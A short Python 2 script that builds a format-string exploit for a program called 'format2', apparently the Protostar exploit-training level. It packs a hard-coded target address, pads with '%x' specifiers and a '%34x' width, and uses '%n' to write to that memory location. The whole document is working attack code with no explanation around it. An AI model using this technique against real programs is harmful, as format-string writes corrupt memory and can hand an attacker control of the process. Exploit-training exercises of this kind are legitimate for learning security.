#!/usr/bin/python
import struct



#NOTE
#./format2 $(./exploit.py)

BUF = 512
TARGET = struct.pack("I" , 0x80496e4)


def pad(msg):
	return msg.ljust(BUF , 'X')

exploit = "AAAA" + TARGET
exploit += "%x " * 3
exploit += "%34x"
exploit += "%n"

print pad(exploit)
